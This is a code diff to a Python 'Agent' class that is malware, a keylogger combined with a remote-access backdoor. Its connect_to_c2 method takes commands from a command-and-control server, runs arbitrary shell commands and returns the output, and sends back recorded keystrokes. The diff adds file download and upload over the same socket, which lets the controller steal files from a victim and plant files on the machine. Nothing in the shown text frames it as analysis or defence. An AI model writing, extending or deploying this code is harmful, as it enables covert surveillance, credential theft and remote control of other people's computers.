@@ -1,4 +1,3 @@
-import csv
 import socket
 import subprocess
 import threading
@@ -23,6 +22,30 @@ class Agent:
         listener = keyboard.Listener(on_press=on_press)
         listener.start()
 
+    def send_file(self, s, filename):
+        try:
+            with open(filename, "rb") as f:
+                s.sendall(b"[STARTFILE]")
+                chunk = f.read(1024)
+                while chunk:
+                    s.sendall(chunk)
+                    chunk = f.read(1024)
+                s.sendall(b"[ENDFILE]")
+        except Exception as e:
+            s.sendall(f"[-] Error reading file: {str(e)}".encode())
+
+    def receive_file(self, s, filename):
+        try:
+            with open(filename, "wb") as f:
+                while True:
+                    data = s.recv(1024)
+                    if b"[ENDFILE]" in data:
+                        f.write(data.replace(b"[ENDFILE]", b""))
+                        break
+                    f.write(data)
+        except Exception as e:
+            print(f"[-] Error saving file: {e}")
+
     def connect_to_c2(self):
         s = socket.socket()
 
@@ -32,20 +55,34 @@ class Agent:
 
             while True:
                 command = s.recv(1024).decode()
+
                 if command.lower() in ["exit", "quit"]:
                     break
 
                 if command == "getlogs":
                     s.send(self.recorded_keys.encode())
-                    with open("keylogs.csv", "w") as f:
+                    with open("keylogs.txt", "w") as f:
                         f.write(self.recorded_keys)
                     self.recorded_keys = ""
+                    continue
+
+                if command.startswith("download"):
+                    filename = command.split(" ", 1)[1]
+                    self.send_file(s, filename)
+                    continue
+
+                if command.startswith("upload "):
+                    filename = command.split(" ", 1)[1]
+                    s.send(b"[READYFORFILE]")  # Handshake: let server know it's ready
+                    self.receive_file(s, filename)
                     continue
 
                 output = subprocess.getoutput(command)
                 if output == "" or output == " ":
                     output = "[+] Command executed (no output)"
                 s.send(output.encode())
+        except KeyboardInterrupt:
+            s.close()
         except Exception:
             pass
         finally:
